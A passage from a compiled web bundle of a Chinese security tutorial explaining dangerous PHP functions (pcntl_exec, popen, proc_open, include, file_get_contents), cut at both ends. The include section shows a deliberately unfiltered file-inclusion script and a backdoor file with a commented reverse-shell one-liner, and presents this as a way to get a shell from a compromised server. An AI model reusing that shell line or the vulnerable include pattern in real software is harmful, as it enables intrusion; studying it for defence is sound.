punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\t",Object(p.b)("span",c({parentName:"span"},{className:"token comment"}),"//将结果返回到一个变量，然后通过输出变量值得到输出内容"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"echo")," ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$result"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"?>"))))),Object(p.b)("h3",{className:"__internal",id:"pcntl_exec"},"pcntl_exec()",Object(p.b)("a",c({parentName:"h3"},{href:"#pcntl_exec","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("p",null,"在当前进程空间执行指定程序。关键点就在于进程空间，倘若我现在设定一个条件，你只有在某个子进程中才能读取phpinfo，那这个时候，我们就需要用到这个函数了。"),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),Object(p.b)("span",c({parentName:"code"},{className:"token function"}),"pcntl_exec"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"(")," string ",Object(p.b)("span",c({parentName:"code"},{className:"token variable"}),"$path"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"["),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),",")," ",Object(p.b)("span",c({parentName:"code"},{className:"token keyword"}),"array")," ",Object(p.b)("span",c({parentName:"code"},{className:"token variable"}),"$args"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"["),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),",")," ",Object(p.b)("span",c({parentName:"code"},{className:"token keyword"}),"array")," ",Object(p.b)("span",c({parentName:"code"},{className:"token variable"}),"$envs"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"]"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"]")," ",Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),")")," ",Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),":")," void"))),Object(p.b)("h4",{className:"__internal",id:"参数-12"},"参数",Object(p.b)("a",c({parentName:"h4"},{href:"#%E5%8F%82%E6%95%B0-12","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("ul",null,Object(p.b)("li",c({parentName:"ul"},{className:"__internal"}),"path：path必须时可执行二进制文件路径或在一个文件第一行指定了一个可执行文件路径标头的脚本(比如文件第一行是#!/usr/local/bin/perl的perl脚本)"),Object(p.b)("li",c({parentName:"ul"},{className:"__internal"}),"args：此参数是一个传递给程序的参数的字符串数组"),Object(p.b)("li",c({parentName:"ul"},{className:"__internal"}),"envs：环境变量，这个想必大家都很熟悉，只不过这里强调一点，这里传入的是数组，数组格式是 key => value格式的，key代表要传递的环境变量的名称，value代表该环境变量值。")),Object(p.b)("p",null,"示例代码："),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),"//father\n",Object(p.b)("span",c({parentName:"code"},{className:"token php language-php"}),Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"<?php"),"\n\t",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"pcntl_exec"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token single-quoted-string string"}),"'/usr/local/bin/php'"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),",")," ",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"["),Object(p.b)("span",c({parentName:"span"},{className:"token single-quoted-string string"}),"'2.php'"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"]"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"?>")),"\n"))),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),"//son\n",Object(p.b)("span",c({parentName:"code"},{className:"token php language-php"}),Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"<?php"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"while"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token boolean constant"}),"true"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"{"),"\n        ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"echo")," ",Object(p.b)("span",c({parentName:"span"},{className:"token single-quoted-string string"}),"'ok'"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"}"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"?>"))))),Object(p.b)("h3",{className:"__internal",id:"popen"},"popen()",Object(p.b)("a",c({parentName:"h3"},{href:"#popen","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("p",null,"此函数使用command参数打开进程文件指针。如果出错，那么该函数就会返回FALSE。"),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),Object(p.b)("span",c({parentName:"code"},{className:"token function"}),"popen"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),"command",Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),","),"mode",Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),")")))),Object(p.b)("h4",{className:"__internal",id:"参数-13"},"参数",Object(p.b)("a",c({parentName:"h4"},{href:"#%E5%8F%82%E6%95%B0-13","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("ul",null,Object(p.b)("li",c({parentName:"ul"},{className:"__internal"}),"command：要执行的命令"),Object(p.b)("li",c({parentName:"ul"},{className:"__internal"}),"mode：必需。规定连接的模式",Object(p.b)("ul",{parentName:"li"},Object(p.b)("li",c({parentName:"ul"},{className:"__internal"}),"r：只读"),Object(p.b)("li",c({parentName:"ul"},{className:"__internal"}),"w：只写（打开并清空已有文件或创建一个新文件）")))),Object(p.b)("p",null,"代码示例："),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),Object(p.b)("span",c({parentName:"code"},{className:"token php language-php"}),Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"<?php"),"\n\t",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$file")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"popen"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"demo.txt"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),","),Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"r"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n\t",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"pclose"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$file"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"?>")),"\n\n",Object(p.b)("span",c({parentName:"code"},{className:"token php language-php"}),Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"<?php"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$file")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"popen"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"/bin/ls"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),","),Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"r"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token comment"}),"//some code to be executed"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"pclose"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$file"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"?>"))))),Object(p.b)("h3",{className:"__internal",id:"proc_open"},"proc_open()",Object(p.b)("a",c({parentName:"h3"},{href:"#proc_open","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("p",null,"此函数执行一个命令，并且打开用来输入或者输出的文件指针"),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),Object(p.b)("span",c({parentName:"code"},{className:"token function"}),"proc_open"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"(")," string ",Object(p.b)("span",c({parentName:"code"},{className:"token variable"}),"$cmd"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),",")," ",Object(p.b)("span",c({parentName:"code"},{className:"token keyword"}),"array")," ",Object(p.b)("span",c({parentName:"code"},{className:"token variable"}),"$descriptorspec"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),",")," ",Object(p.b)("span",c({parentName:"code"},{className:"token keyword"}),"array")," ",Object(p.b)("span",c({parentName:"code"},{className:"token operator"}),"&"),Object(p.b)("span",c({parentName:"code"},{className:"token variable"}),"$pipes"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"["),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),",")," string ",Object(p.b)("span",c({parentName:"code"},{className:"token variable"}),"$cwd")," ",Object(p.b)("span",c({parentName:"code"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"code"},{className:"token constant"}),"NULL"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"["),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),",")," ",Object(p.b)("span",c({parentName:"code"},{className:"token keyword"}),"array")," ",Object(p.b)("span",c({parentName:"code"},{className:"token variable"}),"$env")," ",Object(p.b)("span",c({parentName:"code"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"code"},{className:"token constant"}),"NULL"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"["),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),",")," ",Object(p.b)("span",c({parentName:"code"},{className:"token keyword"}),"array")," ",Object(p.b)("span",c({parentName:"code"},{className:"token variable"}),"$other_options")," ",Object(p.b)("span",c({parentName:"code"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"code"},{className:"token constant"}),"NULL"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"]"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"]"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"]")," ",Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),")")," "))),Object(p.b)("p",null,"此函数其实和",Object(p.b)("inlineCode",{parentName:"p"},"popen"),"函数类似，都是执行命令"),Object(p.b)("h4",{className:"__internal",id:"参数-14"},"参数",Object(p.b)("a",c({parentName:"h4"},{href:"#%E5%8F%82%E6%95%B0-14","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("ul",null,Object(p.b)("li",c({parentName:"ul"},{className:"__internal"}),"cmd：要执行的命令"),Object(p.b)("li",c({parentName:"ul"},{className:"__internal"}),"descriptorspec：索引数组。数组中的键值表示描述符，元素值表示 PHP 如何将这些描述符传送至子进程。0 表示标准输入（stdin），1 表示标准输出（stdout），2 表示标准错误（stderr）。"),Object(p.b)("li",c({parentName:"ul"},{className:"__internal"}),"pipes：将被置为索引数组，其中的元素是被执行程序创建的管道对应到PHP这一段的文件指针。"),Object(p.b)("li",c({parentName:"ul"},{className:"__internal"}),"cwd：要执行命令的初始工作目录。必需是绝对路径。此参数默认使用 NULL（表示当前 PHP 进程的工作目录）"),Object(p.b)("li",c({parentName:"ul"},{className:"__internal"}),"env。要执行命令所使用的环境变量。此参数默认为 NULL（表示和当前 PHP 进程相同的环境变量）"),Object(p.b)("li",c({parentName:"ul"},{className:"__internal"}),"other_options：可选。附加选项",Object(p.b)("ul",{parentName:"li"},Object(p.b)("li",c({parentName:"ul"},{className:"__internal"}),"suppress_errors （仅用于 Windows 平台）：设置为 TRUE 表示抑制本函数产生的错误。 "),Object(p.b)("li",c({parentName:"ul"},{className:"__internal"}),"bypass_shell （仅用于 Windows 平台）：设置为 TRUE 表示绕过 cmd.exe shell。 ")))),Object(p.b)("p",null,"说白了，其实就是执行命令，只不过其中多了一些选项，包括目录的，环境变量的等。"),Object(p.b)("p",null,"示例代码："),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),Object(p.b)("span",c({parentName:"code"},{className:"token variable"}),"$descriptorspec")," ",Object(p.b)("span",c({parentName:"code"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"code"},{className:"token keyword"}),"array"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),"\n\t\t\t",Object(p.b)("span",c({parentName:"code"},{className:"token number"}),"0")," ",Object(p.b)("span",c({parentName:"code"},{className:"token operator"}),"="),Object(p.b)("span",c({parentName:"code"},{className:"token operator"}),">")," ",Object(p.b)("span",c({parentName:"code"},{className:"token keyword"}),"array"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"code"},{className:"token double-quoted-string string"}),'"pipe"'),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),",")," ",Object(p.b)("span",c({parentName:"code"},{className:"token double-quoted-string string"}),'"r"'),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),","),"\t",Object(p.b)("span",c({parentName:"code"},{className:"token comment"}),"//标准输入，子进程从此管道读取数据"),"\n\t\t\t",Object(p.b)("span",c({parentName:"code"},{className:"token number"}),"1")," ",Object(p.b)("span",c({parentName:"code"},{className:"token operator"}),"="),Object(p.b)("span",c({parentName:"code"},{className:"token operator"}),">")," ",Object(p.b)("span",c({parentName:"code"},{className:"token keyword"}),"array"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"code"},{className:"token double-quoted-string string"}),'"pipe"'),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),",")," ",Object(p.b)("span",c({parentName:"code"},{className:"token double-quoted-string string"}),'"w"'),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),","),"\t",Object(p.b)("span",c({parentName:"code"},{className:"token comment"}),"//标准输出，子进程向此管道写入数据"),"\n\t\t\t",Object(p.b)("span",c({parentName:"code"},{className:"token number"}),"2")," ",Object(p.b)("span",c({parentName:"code"},{className:"token operator"}),"="),Object(p.b)("span",c({parentName:"code"},{className:"token operator"}),">")," ",Object(p.b)("span",c({parentName:"code"},{className:"token keyword"}),"array"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"code"},{className:"token double-quoted-string string"}),'"file"'),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),",")," ",Object(p.b)("span",c({parentName:"code"},{className:"token double-quoted-string string"}),'"/opt/figli/php/error-output.txt"'),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),","),Object(p.b)("span",c({parentName:"code"},{className:"token double-quoted-string string"}),'"a"'),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),")"),"\t",Object(p.b)("span",c({parentName:"code"},{className:"token comment"}),"//标准错误，写入到指定文件"),"\n\t\t\t",Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),";"),"\n \n \n\t",Object(p.b)("span",c({parentName:"code"},{className:"token variable"}),"$process")," ",Object(p.b)("span",c({parentName:"code"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"code"},{className:"token function"}),"proc_open"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"code"},{className:"token double-quoted-string string"}),'"ls -a"'),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),",")," ",Object(p.b)("span",c({parentName:"code"},{className:"token variable"}),"$descriptorspec"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),",")," ",Object(p.b)("span",c({parentName:"code"},{className:"token variable"}),"$pipes"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),";"),"\n \n\t",Object(p.b)("span",c({parentName:"code"},{className:"token keyword"}),"if"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"code"},{className:"token function"}),"is_resource"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"code"},{className:"token variable"}),"$process"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"{"),"\n \n\t\t",Object(p.b)("span",c({parentName:"code"},{className:"token keyword"}),"echo")," ",Object(p.b)("span",c({parentName:"code"},{className:"token function"}),"stream_get_contents"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"code"},{className:"token variable"}),"$pipes"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"["),Object(p.b)("span",c({parentName:"code"},{className:"token number"}),"1"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"]"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),";"),"\n\t\t",Object(p.b)("span",c({parentName:"code"},{className:"token function"}),"fclose"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"code"},{className:"token variable"}),"$pipes"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"["),Object(p.b)("span",c({parentName:"code"},{className:"token number"}),"1"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"]"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),";"),"\n \n\t\t",Object(p.b)("span",c({parentName:"code"},{className:"token function"}),"proc_close"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"code"},{className:"token variable"}),"$process"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),";"),"\t",Object(p.b)("span",c({parentName:"code"},{className:"token comment"}),"//在调用proc_close之前必须关闭所有管道"),"\n\t",Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"}")))),Object(p.b)("h2",{className:"__internal",id:"文件包含"},"文件包含",Object(p.b)("a",c({parentName:"h2"},{href:"#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("h3",{className:"__internal",id:"include"},"include()",Object(p.b)("a",c({parentName:"h3"},{href:"#include","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("p",null,Object(p.b)("inlineCode",{parentName:"p"},"include"),"将会包含语句并执行指定文件"),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),Object(p.b)("span",c({parentName:"code"},{className:"token keyword"}),"include")," ",Object(p.b)("span",c({parentName:"code"},{className:"token single-quoted-string string"}),"'filename'"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),";")))),Object(p.b)("p",null,"关键点就在于执行指定文件，执行给了我们代码执行的机会。倘若此时我们构造了一个后门文件，需要在目标机器执行进行shell反弹，那么如果代码中有",Object(p.b)("inlineCode",{parentName:"p"},"include"),"而且没有进行过滤，那么我们就可以使用该函数来执行我们的后门函数。下面我来演示一下。"),Object(p.b)("p",null,"示例代码(1.php)："),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),Object(p.b)("span",c({parentName:"code"},{className:"token php language-php"}),Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"<?php"),"\n\t",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"highlight_file"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token constant"}),"__FILE__"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n\t",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$file")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$_GET"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"["),Object(p.b)("span",c({parentName:"span"},{className:"token single-quoted-string string"}),"'file'"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"]"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n\t",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"include")," ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$file"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"?>"))))),Object(p.b)("p",null,"示例代码(2.php)："),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),Object(p.b)("span",c({parentName:"code"},{className:"token php language-php"}),Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"<?php"),"\n\t",Object(p.b)("span",c({parentName:"span"},{className:"token comment"}),"//这里可以使用PHP来反弹shell，我这里只是演示"),"\n\t",Object(p.b)("span",c({parentName:"span"},{className:"token comment"}),'//$sock=fsockopen("127.0.0.1",4444);exec("bin/bash -i <&3 >&3 2>&3");'),"\n\t",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"echo")," ",Object(p.b)("span",c({parentName:"span"},{className:"token single-quoted-string string"}),"'<br><h1>[*]backdoor is running!</h1>'"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"?>"))))),Object(p.b)("p",null,"执行结果："),Object(p.b)("p",null,Object(p.b)("img",c({parentName:"p"},{src:"/images/20200830215933.png",alt:null}))),Object(p.b)("h3",{className:"__internal",id:"include_once"},"include_once()",Object(p.b)("a",c({parentName:"h3"},{href:"#include_once","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("p",null,Object(p.b)("inlineCode",{parentName:"p"},"include_once"),"与",Object(p.b)("inlineCode",{parentName:"p"},"include"),"没有太大区别，唯一的其区别已经在名称中体现了，就是相同的文件只包含一次。其他功能和",Object(p.b)("inlineCode",{parentName:"p"},"include_once"),"一样，只是增加对每个文件包含的次数。"),Object(p.b)("h3",{className:"__internal",id:"require"},"require()",Object(p.b)("a",c({parentName:"h3"},{href:"#require","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("p",null,Object(p.b)("inlineCode",{parentName:"p"},"require"),"的实现和",Object(p.b)("inlineCode",{parentName:"p"},"include"),"功能几乎完全相同，那既然一样为什么还要多一个这样的函数呢？( 我也不知道)"),Object(p.b)("p",null,"其实两者还是有点区别的，什么区别呢？这么说，如果你包含的文件的代码里面有错误，你觉得会发生什么？是继续执行包含的文件，还是停止执行呢？所以区别就在这里产生了。"),Object(p.b)("p",null,Object(p.b)("inlineCode",{parentName:"p"},"require"),"在出错时会导致脚本终止，而",Object(p.b)("inlineCode",{parentName:"p"},"include"),"在出错时只是发生警告，脚本还是继续执行。"),Object(p.b)("h3",{className:"__internal",id:"require_once"},"require_once()",Object(p.b)("a",c({parentName:"h3"},{href:"#require_once","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("p",null,"这个我觉得你看完上面的，应该就懂了。这两者关系和",Object(p.b)("inlineCode",{parentName:"p"},"include"),"与",Object(p.b)("inlineCode",{parentName:"p"},"include_once"),"的关系是一样的。"),Object(p.b)("h3",{className:"__internal",id:"总结-1"},"总结",Object(p.b)("a",c({parentName:"h3"},{href:"#%E6%80%BB%E7%BB%93-1","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("p",null,"文件包含有很多利用手段，其中在实际环境中，例如我们向服务器写入了后门，但是我们无法直接连接服务器，那么如果有文件包含函数，我们可以通过文件包含函数包含执行我们的后门函数，让服务器反弹连接我们。岂不美哉。"),Object(p.b)("h2",{className:"__internal",id:"文件读取下载"},"文件读取(下载)",Object(p.b)("a",c({parentName:"h2"},{href:"#%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E4%B8%8B%E8%BD%BD","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("h3",{className:"__internal",id:"file_get_contents"},"file_get_contents()",Object(p.b)("a",c({parentName:"h3"},{href:"#file_get_contents","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("p",null,"函数功能是将整个文件读入一个字符串"),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),Object(p.b)("span",c({parentName:"code"},{className:"token function"}),"file_get_contents"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),"path",Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),","),"include_path",Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),","),"context",Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),","),"start",Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),","),"max_length",Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),")")))),Object(p.b)("h4",{className:"__internal",id:"参数-15"},"参数",Object(p.b)("a",c({parentName:"h4"},{href:"#%E5%8F%82%E6%95%B0-15","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("ul",null,Object(p.b)("li",c({parentName:"ul"},{className:"__internal"}),"filename：要读取文件的名称。"),Object(p.b)("li",c({parentName:"ul"},{className:"__internal"}),"include_path：可选。如果也想在 include_path 中搜索文件，可以设置为1。"),Object(p.b)("li",c({parentName:"ul"},{className:"__internal"}),"context：可选。规定句柄的位置。"),Object(p.b)("li",c({parentName:"ul"},{className:"__internal"}),"start：可选。规定文件中开始读取的位置。"),Object(p.b)("li",c({parentName:"ul"},{className:"__internal"}),"max_length：可选。规定读取的字节数。")),Object(p.b)("p",null,"代码示例："),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),Object(p.b)("span",c({parentName:"code"},{className:"token php language-php"}),Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"<?php"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"echo")," ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"file_get_contents"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token single-quoted-string string"}),"'demo.txt'"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"?>")),"\n    \n执行结果——>\nI am a demo text"))),Object(p.b)("h3",{className:"__internal",id:"fopen"},"fopen()",Object(p.b)("a",c({parentName:"h3"},{href:"#fopen","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("p",null,"此函数将打开一个文件或URL，如果 fopen() 失败，它将返回 FALSE 并附带错误信息。我们可以通过在函数名前面添加一个 